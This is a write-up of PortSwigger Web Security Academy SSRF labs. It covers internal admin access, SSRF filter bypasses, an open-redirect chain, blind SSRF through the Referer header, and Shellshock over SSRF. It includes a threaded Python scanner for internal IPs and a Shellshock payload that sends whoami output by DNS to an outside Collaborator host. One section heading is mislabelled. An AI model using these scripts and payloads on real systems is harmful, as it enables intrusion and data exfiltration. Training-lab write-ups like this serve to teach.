# Server Side Request Forgery 

<h3> Lab: Basic SSRF against the local server </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/32997785-74fe-46ec-a190-4075db32ec9c)

After going over to the web page i see this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3cd6f9f7-7910-48bc-9d12-a47ac10ad906)

Checking a random product shows this stock get function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6cc8f8b0-d8cd-49de-839c-b42962b14a67)

Intercepting the request and clicking it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2f4f356c-2839-4157-946c-f23483913339)

It is loading the stock value from an external url 

Since the aim of this challenge is to delete the user *carlos* on the */admin* directory from the internal web app let us do that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b1d984ff-4d0e-4f13-ba52-942d409a7fa5)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb603606-d8cf-4ee7-aeb0-f6b876f84a2b)

The path to delete it is */admin/delete?username=carlos*

Doing that works and we get challenge solved
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c5a88ce6-d848-4046-9adb-c1477d55340c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9b984c07-8bae-4a36-adc3-4098a16b121a)


<h3> Lab: Basic SSRF against another back-end system </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d4db110-6343-48b3-94c3-3a3a35a3cb0e)

Going over to the web app shows still the same function as the previous one
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb7a87f4-8032-4308-aa57-e3032ff91635)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09c8cf2d-78c5-46e5-8c88-bf5162563c83)

The aim for this challenge is to scan the internal *192.168.0.X* range for an admin interface on port *8080*, then use it to delete the user carlos

I didn't want to use burp intruder for it so i made a script for it

```python
#!/usr/bin/python3
import requests
from time import sleep
from threading import Thread

def sendRequest(url, cookie, ip):
    # Exclude ip 192.168.0.1, which is the stock API address
    if ip == '192.168.0.1':
        return

    data = {
        'stockApi': f'http://{ip}:8080/'
    }

    # Send a POST request to /product/stock, and the data is the SSRF payload
    StatusCode = requests.post(url, cookies=cookie, data=data).status_code

    # Using \r to clean previous line
    print(f'[*] Trying ip: {ip}', end='\r')

    if StatusCode != 500:
        print(f'[+] Found a valid internal ip address: {ip}')

def main():
    url = 'https://0aa60010032c1eab80b7a35b002b000e.web-security-academy.net/product/stock'
    cookie = {'session': 'OS7X5KkySnlT6ocIvQfQuvWPt10SKciB'}

    # Generate a list of IPv4 private ip addresses from 192.168.0.0 to 192.168.0.255
    ipAddressList = list()

    for lastOctet in range(256):
        ipAddressList.append(f'192.168.0.{lastOctet}')

    # For each private ip address, spawn a new thread to function sendRequest(url, cookie, ip)
    for ip in ipAddressList:
        thread = Thread(target=sendRequest, args=(url, cookie, ip))
        thread.start()

        sleep(0.1)


if __name__ == '__main__':
    main()

```

Running it gives the ip 

```
➜  Desktop python3 solve.py
[+] Found a valid internal ip address: 192.168.0.48
➜  Desktop 
```

Trying it over my proxy gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8611e4a3-100e-4f61-86bd-aa343896efcf)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2cf4a98a-590d-46d3-aa80-37599f54db87)

We can now delete the user *carlos*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26b903b0-163f-4513-be3f-7ee33256f6f7)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/23acecf1-27da-42ef-9b37-76f3803c2be9)

<h3> Lab: SSRF with blacklist-based input filter </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/486edb3d-bc92-48e8-b78d-d526adb663de)

Moving over to the web app shows the normal function we've been seeing
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53f9dcf8-beeb-4cc1-b70e-cd683703291b)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/555f291f-8e18-4542-bb81-3dbca2f9a461)

But when I tried accessing localhost in the stockApi variable I get an error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/953fd872-21d7-47e8-bb38-5093f103f3f6)

<h3> Lab: SSRF with filter bypass via open redirection vulnerability </h3>

So we need to bypass this

I decided to try each value of what we are trying to access individually
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5452ceec-c07f-401a-aa56-67a579a4fc5b)

Trying : `http://127.1` gives `200` Ok
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c5e739a0-5c76-4e50-93c7-57bd261901c9)

But appending /admin gives an error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5b29c541-7bf5-460c-816c-7ac8e3624072)

One thing we can try here is case changing any letter of */admin* to uppercase as the web server might treat it as normal word

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e161ad0e-51fe-45b4-80f1-149a42aed2f1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/739bfefe-9db6-418c-8215-a6b51ef65fd7)

Now we can delete the user carlos account
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5317f144-dd12-47ac-be38-588d0e357ae6)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cb5cda62-d6fc-402a-b20b-61ccadfe486e)


<h3> Lab: SSRF with filter bypass via open redirection vulnerability </h3>
 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8f0c3f4-0595-4ff1-a7b5-4b95fbe90549)

Going over the web page as usual shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/08397187-b5b2-47b5-afeb-6e6160ec7377)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b302250-5016-4480-84b4-230b938b33b8)

But when i clock on the Stock button i don't see any variable that is querying a url from an external / internal source
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3c7596a-d80e-4405-a2ec-5320dfae038b)

So no ssrf here but notice the path:

```
/product/stock/check?productId=1&storeId=1
```

But looking below shows a button that can either return to list or go to next product
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6e4efeef-4ada-4062-9a66-adf15a77c08a)
 
 Clicking the next product button while intercepting the request shows this
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/655f87a8-3a19-48ef-b4b1-3fb55b3d0ac8)

The path looks interesting:

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2
```

I'll send it over to repeater to play with the parameter

But i noticed that when i forward the request it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/059419d3-b900-4b67-9ede-c07c3fdd8faf)

So that means we have an open redirect since this current parameter is called from the previous one

With this we can modify the path value to call an internal source which is this `http://192.168.0.12:8080/admin/delete?username=carlos` on the view stock request
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00115dfe-ecac-4411-ada1-eeebd5ceff15)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4f51be2-880c-4e08-89ee-206024bd1395)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac21d5f2-66f3-4252-b803-3a03beb19744)


<h3> Lab: Blind SSRF with out-of-band detection </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fdac9e03-a1cd-4184-b37d-caa8c0744e20)

After checking the web server i got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d73976b-f3af-44f4-b703-3a83899c48a4)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7a283f22-21ff-4a15-a516-4ef3fed31fd7)

There's no stock button this around to click which is interesting

But clicking that Return to list button while on my proxy shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56ddfcd5-cd0f-4c5f-93e8-7bef40c56eb0)

I send it to Repeater
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/402222e3-c751-458d-ae5c-8aa6631e7415)

Nothing really looks interesting

How about clicking on a product while the request is being intercepted
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/193dec96-e151-4edb-9c88-3b4d83122c75)

I also forwarded this to Repeater
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b32f5b1a-7286-4047-b9a9-e94f2a681f5f)

Nothing also really looks interesting

The only place that seems where url can be injected is the Referer Header

Let us check for Blind SSRF using OAST

First I opened burp collaborator
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47c7c14e-09c3-49d7-9bc9-78bfd20f2ef3)

Then i copied the url to the from the *Copy to clipboary* button and replaced it as the *Referer Header*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d028e1fa-6a4b-49b4-a98b-57caf9804491)

After forwading the request i then clicked on *Poll now*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ed609d5-83e6-457a-aa40-2aafdac4a24c)

We can see 2 DNS request and a HTTP request was received 

Back on the task we get chall solved
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d230915c-8d17-45a2-849d-352af5f4df6c)


<h3> Lab: SSRF with whitelist-based input filter </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b792a925-7f65-4563-a802-6b134d2d19f8)

Going over to the web page shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4528c6c2-d2ee-4c59-8d8d-13b2d741fc25)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f9b035d-91ed-489a-812c-d0950959e751)

Cool there's a *Check Stock* button 

Clicking on it while intercepting the request shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a81c9364-9c1c-4abf-9dfa-6dc785e68736)

We can see it's making an external call to a url

Let's try injecting our own url to it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/965756c6-32bf-4fc1-a4a8-2d1235017a7e)

Ah it does a strict check for if *stock.weliketoshop.net* is in the url

Hmmm let us see if we can bypass that using `@`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ff385c92-409b-4c80-98b5-3bad75c3d51d)

Now we can use html anchor `#` since the web server didn't block us
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0203d7e6-ebc4-4fa1-8ffe-e3d00369a7c6)

Uhhhhmmm it blocked us 🤔

I'll url encode the html anchor and forward the request again
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d6344a0-3921-49ab-b465-af729fd52c67)

It still blocked us 

Now let us go for double url encode
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cb4dce24-5035-40e6-846b-eeef18b74e5b)

Cool it didn't block us

Since the host `pwner` is non existent that is why we are getting 500 Internal Error

I'll update it to `localhost`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bc2ac660-9dc1-4fa5-abd6-bb552f60d84d)

With this we can delete the user `carlos` account
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/76401b8a-c6f2-483d-9641-2612300a7c1f)

Back on the web we get chall solved
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0c066a0d-688d-4ddc-8ef6-e4dc6549dbb2)




<h3> Lab: Blind SSRF with Shellshock exploitation </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0841c8c7-cf34-4dd5-afa8-c63087ad243b)

Going over the web app shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00691fe9-c2aa-4bcc-80e6-226ae3701ae4)

The function is this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/147fc25b-99e4-4826-80bb-e73157884dc9)

So this means we will be doing some OAST SSRF

I'll click on an item from the main page but this time intercept the request 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/953f4f35-9345-440b-aac5-c37ee502d384)

We can see that the *Referer Header* is where we would likely want to test for SSRF

I opened Burp Collaborator to test for the Blind SSRF
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0fefd2f5-caf3-462a-9ba1-22dd77ce37da)

Looking at the HTTP request made shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/510129b1-fd74-4f15-b713-073ba142e2bc)

We can see that our `User-Agent Header` is reflected when the HTTP request is made

Now back to the exploitation phase

The aim is to exploit a shellshock vulnerability running on `http://192.168.0.x/` where `x = 1-255` which runs on port 8080

And the goal is to exfiltrate the OS user 

Hmmmmm what is ShellShock

```
Shellshock is effectively a Remote Command Execution (RCE) vulnerability in BASH. The vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable. (From OWASP Shellshock Vulnerability PDF)
```

And to exploit it is just by using a bash environment variable which then our command proceeds
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bac1b668-539e-499a-bd9e-cfb41495f69e)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/159cd035-bf8a-4b9a-95d0-59c724b6d32d)

To exploit this i'll take advange of the User Agent Header by putting our payload there

```
() { :; }; /usr/bin/nslookup `whoami`.mukvppqmrd6zqu3d3itx5bq9x03rrg.oastify.com
```

This payload will run OS command nslookup to query the Burp Collaborator’s domain, with the whoami command’s output appended to the subdomain.

But we don't know the host where a web server is running for i'll have to fuzz for it

I made a script to do all the automation for me

```python
#!/usr/bin/python3
# Author: Hack.You
import requests
from time import sleep
from threading import Thread

def sendRequest(url, cookie, ip, payload):
    # Exclude ip 192.168.0.1
    if ip == '192.168.0.1':
        return
    
    header = {
        'User-Agent': f'{payload}',
        'Referer': f'http://{ip}'
    }

    cookie = {
        'session': '3wFPbaDRzL9jDGN5GDnKR7g8tEmc63Fl' # Replace with yo cookie 
    }

    Status = requests.get(url, cookies=cookie, headers=header)

def main():

    url = 'https://0aeb0068031c0ec182286c8f00e80043.web-security-academy.net/product?productId=1'
    
    cookie = {'session': 'OS7X5KkySnlT6ocIvQfQuvWPt10SKciB'}

    payload = '() { :; }; /usr/bin/nslookup $(whoami).qrl3hq5fzultpjt88nx5c171zs5it7.oastify.com'

    # Generate a list of IPv4 private ip addresses from 192.168.0.0 to 192.168.0.255
    ipAddressList = list()

    for lastOctet in range(256):
        ipAddressList.append(f'192.168.0.{lastOctet}:8080')
    
    print(f'[+] Sending payload: {payload}')

    # For each private ip address, spawn a new thread to function sendRequest(url, cookie, ip)
    for ip in ipAddressList:
        thread = Thread(target=sendRequest, args=(url, cookie, ip, payload))
        thread.start()

        sleep(0.1)


if __name__ == '__main__':
    main()
```

After running it I checked the Burp COllaborator then saw a DNS request containing the username
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7df64794-7a6b-49b6-8290-2af4e52816a3)

The DNS query result is `peter-GFomdt.qrl3hq5fzultpjt88nx5c171zs5it7.oastify.com`

So i submitted the username `peter-GFomdt` 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d57d42b5-a391-4644-a48b-bf9a04c49097)


And we're done 👻
